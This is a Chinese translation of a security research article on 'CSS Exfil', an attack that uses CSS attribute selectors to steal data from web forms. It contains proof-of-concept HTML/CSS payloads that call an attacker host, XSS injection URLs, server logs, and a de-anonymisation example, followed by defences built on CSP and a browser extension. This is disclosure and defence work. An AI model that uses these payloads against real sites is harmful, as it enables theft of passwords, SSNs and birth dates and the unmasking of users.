title: 使用CSS窃取数据：攻击与防守
tags:
    - 安全
    - CSS
    - 翻译
comments: true
brief: 使用CSS窃取数据：攻击与防守
date: 2019-04-08
categories:
    - 翻译
---
# [译]使用CSS窃取数据：攻击与防守
    原文地址：https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense    

__摘要__：详细介绍了一种称为CSS Exfil的方法，它可以使用层叠样式表(CSS)作为攻击向量来窃取目标数据。由于现代web严重依赖CSS，各种各样的数据都有潜在的风险，包括:用户名、密码和敏感数据，如出生日期、社保号码和信用卡号码。这项技术也可以对Tor这样的暗网用户进行去匿名。网站用户和网站运营商之间可以采取的防范措施，并提供了一对浏览器扩展来防范此类攻击。

<!-- more -->

## CSS Exfil介绍
几个月前，我开始修改Chrome的XSS审计器，为了寻找可以绕过的旁路。一种可靠地通过Chrome过滤器的远程注入方法是CSS注入。通过使用注入的CSS，攻击者基本上能过完全控制页面的外观和感觉。我还发现攻击者可以利用CSS窃取表单数据。通过单独使用CSS，像NoScript这样的浏览器防护不能阻止数据的流出(尽管NoScript的XSS审计器在阻止一些注入方面比Chrome更有效，概念证明详见下文)。

虽然CSS注入并不是一个新的漏洞，但据我所知，使用CSS作为唯一的攻击向量来可靠地过滤数据的方法从未被提出过。我也不知道以前有任何有效的方法来保护终端用户免受这种攻击，除了阻塞CSS，然而这不是一个实际的解决方案。

## 相关工作
我能找到的唯一一个类似的数据泄漏方法，是2014年在[OWASP网站](https://www.owasp.org/index.php/Testing_for_CSS_Injection_(OTG-CLIENT-005))上的讨论。它给攻击者指明了方向，在web页面上出现某些数据时该如何使用CSS进行攻击。（诚然，我是在后来研究可能的缓解技术时发现这一页的）。几周前，我还听说了一个名为“弯曲样式表”（[Crooked Style Sheets](https://github.com/jbtronics/CrookedStyleSheets)）的GitHub项目，它使用CSS跟踪web用户。

## 开发方法
有多种攻击场景可以利用CSS Exfil，包括:

- 反射或存储的代码注入缺陷(例如易受XSS攻击的任何页面)
- 被劫持或恶意的第三方资源有意或无意地包含在目标元素的DOM(文档对象模型)中。例如：
    + 网络追踪片断
    + 再上市代码
    + 没有封装在iframe中的广告
    + Web开发插件/框架/库
- 恶意或者被劫持的浏览器扩展


## 攻击解剖
CSS Exfil攻击的核心是CSS的“值选择器”，它可以用来解析HTML标签属性数据。以下是这些选择器的摘要(引自W3Schools):

```css
[attribute=value]   [foo=bar]     Selects all elements with foo="bar"
[attribute~=value]  [foo~=bar]    Selects all elements with a foo attribute containing the word "bar"
[attribute|=value]  [foo|=bar]    Selects all elements with a foo attribute value starting with "bar"
[attribute^=value]  [foo^="bar"]  Selects all elements with a foo attribute value starting with "bar"
[attribute$=value]  [foo$="bar"]  Selects all elements with a foo attribute value ending with "bar"
[attribute*=value]  [foo*="bar"]  Selects all elements with a foo attribute which contains the substring "bar"
```

这个简单的例子演示这些选择器是如何被滥用的：

```html
<style>
    #username[value="mikeg"] {
            background:url("https://attacker.host/mikeg");
    }
</style>
<input id="username" value="mikeg" />
```

在以上的例子，当HTML/CSS被渲染到一个网页上的时候，一个背景图片被从远程攻击者的主机加载，从而指示输入框的值是'mikeg'。为了使得攻击更有效，需要额外的文本解析方法。以下是一些概念利用的验证，展示了潜在攻击的多样性、范围和严重性。

## 验证概念 #1
基础的CSS Exfil例子展示如何通过恶意的CSS/HTML泄漏用户数据

```html
<html>
<head>
    <style>
        #username[value*="aa"]~#aa{background:url("https://attack.host/aa");}#username[value*="ab"]~#ab{background:url("https://attack.host/ab");}#username[value*="ac"]~#ac{background:url("https://attack.host/ac");}#username[value^="a"]~#a_{background:url("https://attack.host/a_");}#username[value$="a"]~#_a{background:url("https://attack.host/_a");}#username[value*="ba"]~#ba{background:url("https://attack.host/ba");}#username[value*="bb"]~#bb{background:url("https://attack.host/bb");}#username[value*="bc"]~#bc{background:url("https://attack.host/bc");}#username[value^="b"]~#b_{background:url("https://attack.host/b_");}#username[value$="b"]~#_b{background:url("https://attack.host/_b");}#username[value*="ca"]~#ca{background:url("https://attack.host/ca");}#username[value*="cb"]~#cb{background:url("https://attack.host/cb");}#username[value*="cc"]~#cc{background:url("https://attack.host/cc");}#username[value^="c"]~#c_{background:url("https://attack.host/c_");}#username[value$="c"]~#_c{background:url("https://attack.host/_c");}
    </style>
</head>
<body>
    <form>
        Username: <input type="text" id="username" name="username" value="<?php echo $_GET['username']; ?>" />
        <input id="form_submit" type="submit" value="submit"/>
        <a id="aa"><a id="ab"><a id="ac"><a id="a_"><a id="_a"><a id="ba"><a id="bb"><a id="bc"><a id="b_"><a id="_b"><a id="ca"><a id="cb"><a id="cc"><a id="c_"><a id="_c">
    </form>
</body>
</html>
```

以上的例子并不包含现实全部的情况，但是它能够论证基本的CSS Exfil攻击形式。当一个用户键入字符串包含字母'a'，'b'，'c'，特定的元素将会被一个远程攻击者的服务器上并不存在的图片装饰。使这个攻击成功需要满足三个条件：

- 条件#1：所解析的数据必须在页面加载时显示
- 条件#2：必须存在一个或者多个相对于数据元素的元素可以被CSS选择器选择中
- 条件#3：被装饰的元素必须要能够接受一种带URL的属性样式（例如： background / background-image, list-style / list-style-image, or cursor）。


在访问`hxxps://victim[.]host/css-exfil-poc1[.]php?username=abcab`，攻击者将会收到如下的数据。

```txt
127.0.0.1 - - [25/Jan/2018:22:36:46 -0500] "GET /ab HTTP/1.1" 404 22
127.0.0.1 - - [25/Jan/2018:22:36:46 -0500] "GET /a_ HTTP/1.1" 404 22
127.0.0.1 - - [25/Jan/2018:22:36:46 -0500] "GET /bc HTTP/1.1" 404 22
127.0.0.1 - - [25/Jan/2018:22:36:46 -0500] "GET /_b HTTP/1.1" 404 22
127.0.0.1 - - [25/Jan/2018:22:36:46 -0500] "GET /ca HTTP/1.1" 404 22
```

可以猜测输入的是如下内容：

```txt
a       # a_
ab      # ab
abc     # bc
abca    # ca
abcab   # _b
```

恶意CSS使用模式匹配的两个字符组合('aa'， 'ab'， 'ac'…)，以及检测字符串的第一个和最后一个字母('a_' & '_a' callbacks)。这种方式提供了一个可靠的重组数据方案。其限制是重复模式可能并不总是显而易见的，如果数据解码为多个字符串，那么重构有时可能需要发挥人们的智力。

为什么不使用三个字符或更长的来匹配呢？一句话:实用性。如果可以预期数据的结构，则可以使用更长的字符串，下面将对此进行说明。攻击的针对性越强，就越有可能做出更好的数据预测，并减少CSS攻击足迹。但是一般来说，双字符先/后字符方法在整个攻击足迹中是最优性能的。

所有两个英文小写字母的排列结果是P(26,2) = 650。三个字母的排列增加到P(26,3) = 15,600,这使得条件#2更加不可能实现。此表描述了各种攻击字母表的属性。

![alphabet](alphabet.png)

根据目标数据元素在页面中的位置，含有大量元素的页面可能会被直接利用而不需要通过HTML进行注入。运行document.getElementsByTagName("*").length;在浏览器控制台中，将在页面上显示DOM(文档对象模型)元素的总数，这可以提供一个上限。例如，我的主页(在撰写本文时)总共有大约750个DOM元素。Slashdot的测试得到了约2,100个元素，谷歌News得到了约6,900个元素!这并不是说每个DOM元素都可以被目标元素正确引用，但是它给出了一个没有额外DOM注入的上限。

## 验证概念 #2
利用注入缺陷向页面中添加虚假的密码输入，并使用CSS Exfil窃取密码。

易被攻击的URL:`hxxp://victim[.]host/css-exfil-poc2[.]php?username="><br/>Password:<form><input type=password name=hidden_ele><br/><input type=submit></form><style>#form_submit{display:none;}</style><br`

```html
<html>
<head>
    <style>
        #hidden_ele[value*="aa"]~#aa{background:url("https://attacker.host/aa");}#hidden_ele[value*="ab"]~#ab{background:url("https://attacker.host/ab");}#hidden_ele[value*="ac"]~#ac{background:url("https://attacker.host/ac");}#hidden_ele[value^="a"]~#a_{background:url("https://attacker.host/a_");}#hidden_ele[value$="a"]~#_a{background:url("https://attacker.host/_a");}#hidden_ele[value*="ba"]~#ba{background:url("https://attacker.host/ba");}#hidden_ele[value*="bb"]~#bb{background:url("https://attacker.host/bb");}#hidden_ele[value*="bc"]~#bc{background:url("https://attacker.host/bc");}#hidden_ele[value^="b"]~#b_{background:url("https://attacker.host/b_");}#hidden_ele[value$="b"]~#_b{background:url("https://attacker.host/_b");}#hidden_ele[value*="ca"]~#ca{background:url("https://attacker.host/ca");}#hidden_ele[value*="cb"]~#cb{background:url("https://attacker.host/cb");}#hidden_ele[value*="cc"]~#cc{background:url("https://attacker.host/cc");}#hidden_ele[value^="c"]~#c_{background:url("https://attacker.host/c_");}#hidden_ele[value$="c"]~#_c{background:url("https://attacker.host/_c");}
    </style>
</head>
<body>
    <form>
        Username: <input type="text" id="username" name="username" value="<?php echo $_GET['username']; ?>" />
        <input id="hidden_ele" name="hidden_ele" type="hidden" value="<?php echo $_GET['hidden_ele'] ?> "/>
        <input id="form_submit" type="submit" value="submit"/>
        <a id="aa"><a id="ab"><a id="ac"><a id="a_"><a id="_a"><a id="ba"><a id="bb"><a id="bc"><a id="b_"><a id="_b"><a id="ca"><a id="cb"><a id="cc"><a id="c_"><a id="_c">
    </form>
</body>
</html>
```

![css-exfil-poc2](css-exfil-poc2.png)


上面的例子很像poc# 1，但是利用了一个代码注入缺陷在页面上添加了一个伪密码输入。如果受害者输入他们的密码并按enter键，密码将在页面加载时传递给hidden_ele，满足CSS Exfil条件#1。

## 验证概念 #3
利用扩展字母表的 CSS Exfil偷取用户名

易被攻击的URL:`hxxp://attack[.]host/css-exfil-poc3[.]php?username=ZeroC00L`

```html
<html>
<head>
</head>
<body>
    <form>
        Username: <input type="text" id="username" name="username" value="<?php echo $_GET["username"] ?>" />
        <link href="http://attacker.host/css-exfil.php?css" rel="stylesheet" type="text/css">
        <?php include("css-exfil.php"); echo $_html; ?>
    </form>
</body>
</html>
```

上面的代码依赖于将46KB的HTML注入到css- ext .php提供的DOM中。这样方便的利用脚本是不现实的。在真实的攻击场景中，代码将通过其他方法注入。

受害者访问易受攻击的URL后远程调用攻击者的资源的情况:

```txt
127.0.0.1 - - [30/Jan/2018:11:09:35 -0500] "GET /00 HTTP/1.1" 404 22
127.0.0.1 - - [30/Jan/2018:11:09:35 -0500] "GET /0L HTTP/1.1" 404 22
127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /Ze HTTP/1.1" 404 22
127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /Z_ HTTP/1.1" 404 22
127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /ro HTTP/1.1" 404 22
127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /oC HTTP/1.1" 404 22
127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /_L HTTP/1.1" 404 22
127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /er HTTP/1.1" 404 22
127.0.0.1 - - [30/Jan/2018:11:09:36 -0500] "GET /C0 HTTP/1.1" 404 22
```

数据装配：

```txt
Z           # Z_
Ze          # Ze
Zer         # er
Zero        # ro
ZeroC       # oC
ZeroC0      # C0
ZeroC00     # 00
ZeroC00L    # 0L _L
```

## 验证概念 #4
利用CSS Exfil来验证可疑的暗网用户的身份，通过欺骗用户点击链接。

易受攻击的URL：`hxxp://victim[.]host/css-exfil-poc4[.]php?xss="><style>[value="deadbeef"]{background:url("hxxps://victim[.]host/deadbeef_found");}</style><br`

```html
<html>
<head>
</head>
<body>
    <form>
        <h1>Your Account</h1>
        Username: <input id="username" value="deadbeef"><br/>
        XSS Field: <input type="text" name="xss" value="<?php echo $_GET["xss"] ?>" />
    </form>
</body>
</html>
```

远程攻击者接到的信号

```txt
127.0.0.1 - - [30/Jan/2018:18:06:35 -0500] "GET /deadbeef_found HTTP/1.1" 404 22
```

上面的日志条目将确认目标确实是用户“deadbeef”，从而去匿名化他们的身份。

## 验证概念 #5
通过代码注入缺陷利用CSS Exfil去偷取社保号（SSN）和出生日期

易受攻击的URL：`hxxp://victim[.]host/css-exfil-poc5[.]php?xss="><link href='hxxps://attack[.]host/poc5-css.php' rel='stylesheet' type='text/css'><input name='xss' type='hidden' value='"><link href=/poc5-css.php rel=stylesheet type=text/css><br'><br><input type=submit value='Click to continue...'><style>[value=submit]{display:none;}.fields-note{display:none;}.fields-last{display:none;}</style><br`

```html
<html>
<head>
</head>
<body>
    <form>
        <h1>Secure Sign Up Form</h1>

            <div class="form-container">

                <div class="fields-ssn">
                    <label>Social Security number*</label>
                    <br>
                    <input name="ssn1" type="password" size="3" maxlength="3" value="<?php echo $_GET["ssn1"] ?>">
                    <input name="ssn2" type="password" size="2" maxlength="2" value="<?php echo $_GET["ssn2"] ?>">
                    <input name="ssn3" type="password" size="4" maxlength="4" value="<?php echo $_GET["ssn3"] ?>">
                </div>

                <div class="fields-dob">
                    <label>Date of birth*</label>
                    <br>
                    <input name="dob1" type="text" size="2" maxlength="2" value="<?php echo $_GET["dob1"] ?>">
                    <input name="dob2" type="text" size="2" maxlength="2" value="<?php echo $_GET["dob2"] ?>">
                    <input name="dob3" type="text" size="4" maxlength="4" value="<?php echo $_GET["dob3"] ?>">
                </div>

                XSS Field: <input name="xss" value="<?php echo $_GET["xss"] ?>"/>

                <div class="fields-note">
                    <div>
                        <em>Provide your e-mail address for faster results!</em>
                    </div>
                </div>

                <div class="fields-last">
                    <div class="col">
                        <label>Email address:</label>
                        <input name="email" type="text">
                    </div>
                    <div class="col">
                        <label>Confirm email address</label>
                        <input name="emailConfirm" type="text">
                    </div>
                 </div>

                 <div>
                    <input id="submit_form" type="submit" value="submit" />
                 </div>
        </div>
    </form>
</body>
</html>
```

当访问易受攻击的URL后攻击者的远程服务器会收到以下调用：

```txt
127.0.0.1 - - [31/Jan/2018:19:45:41 -0500] "GET /Jan HTTP/1.1" 404 22
127.0.0.1 - - [31/Jan/2018:19:45:41 -0500] "GET /31 HTTP/1.1" 404 22
127.0.0.1 - - [31/Jan/2018:19:45:41 -0500] "GET /1975 HTTP/1.1" 404 22
127.0.0.1 - - [31/Jan/2018:19:45:41 -0500] "GET /ssn6789 HTTP/1.1" 404 22
127.0.0.1 - - [31/Jan/2018:19:45:41 -0500] "GET /ssn45 HTTP/1.1" 404 22
127.0.0.1 - - [31/Jan/2018:19:45:41 -0500] "GET /ssn123 HTTP/1.1" 404 22
```

装配数据

```txt
01/31/1975   # /Jan /31 /1975
123-45-6789  # /ssn123 /ssn45 /ssn6789
```

![css-exfil-poc5](css-exfil-poc5.png)

上面的例子灵感是来源于我遇到的一个真实案例,并容易使用的代码注入缺陷: 
1)包括一个远程的CSS文件((hxxp://attack[.]host/poc5-css.php) 
2)改变页面出现形式是一个两步的过程,所以用户必须提交表单继续输入数据。在重新加载时，先前输入的数据出现在加载满足条件#1的页面上。由于可以对目标数据进行假设，因此页面上只需要显示6个DOM元素(表单中针对的6个输入框)。由于数字数据(例如SSN、出生日期、信用卡数据)依赖于一个小字母表，所以CSS Exfil是一个特别有效和现实的攻击场景。

## 防御CSS Exfil
### 网站维护者的防御方案
最好的防御方式对于网站控制者来说是使用内容安全策略（Content Security Policy，CSP）作为网站配置的一部分。修复代码注入缺陷并使用Web应用程序防火墙可能会有所帮助，但是仍然有一些CSS Exfil攻击类可能对您的网站仍然有效，并且不在网站维护者的直接控制范围内(比如恶意浏览器扩展或通过广告注入代码)。通过添加内容安全策略，将会限制攻击者通过调用远程URL吸取数据或者包含CSS文件。

除了防止CSS Exfil之外，CSP还提供了许多好处。尽管对于复杂的站点来说，CSP有时很难实现。我推荐阅读下积极倡导使用CSP的两位安全专家 Troy Hunt 和 Scott Helme 提供的材料。在某些攻击场景中，CSP可能不起作用，比如白名单资源受到了破坏，但是CSP仍会给攻击者带来麻烦。

### 网站用户的防御方案

对于Web用户来说防止恶意CSS的最好方式是阻止恶意CSS被浏览器解析。同样地，我开发了款浏览器插件用于防止CSS Exfil攻击，支持Chrome和Firefox。我在这个网站上做了一个易损性测试的功能，因此你可以在此测试你的浏览器是否是易受攻击的。这个插件是完全开源且能够被检查的，它被开源在[Github](https://github.com/mlgualtieri/CSS-Exfil-Protection)上。它被按照原样提供，使用MIT协议，不需要任何担保或授权。

各个插件（Chrome和Firefox）都是通过对加载到web页面上的CSS进行预处理来工作的。每个CSSRule的检查和清理都是通过浏览器的原生CSSStyleSheet JavaScript API完成的。如果一个CSSRule.selectorText被匹配：1）解析一个元素匹配的属性值，然后2）如果这个符合的CSSRule.cssText包含一个远程的URL则一个新的规则会被创建用于覆盖调用远程URL。

因为CSSRule属性不可用，跨域样式表需要一些额外的处理。访问跨域样式表的CSSRule属性违反了浏览器本地的跨域资源共享安全策略。要正确地清理跨域样式表，需要创建一个临时的同源样式表，并对其进行清理和删除。
Chrome还需要临时阻止某些CSS，以防止加载等待清理的跨域资源。Firefox的实现有额外的复杂性，但最终的工作原理与Chrome版本非常相似。

我已经在我的浏览器中使用了各种形式的插件数周，并且在加载页面时没有注意到任何可见的性能损失或故障。在我看来，被阻止的CSS规则是边缘情况，不会改变99.99%合理的网站的任何代码。

随着安全漏洞的发展，我不能保证这个插件能够阻止所有的CSS Exfil攻击。但是它能够阻止所有在我此刻写下这篇文章时知道的CSS Exfil攻击。如果你管理这个插件提供的旁路保护，我想从你那里听到保护可以添加!我也乐于看到所有主流浏览器都集成了这种类型的防护，到那时就不在需要这款插件了。

## 结论
利用CSS选择器解析来从网站中提取数据的攻击方案已经被提出了几种。浏览器漏洞测试和保护方案已经提供。如果你有任何建设性的意见或建议欢迎反馈。

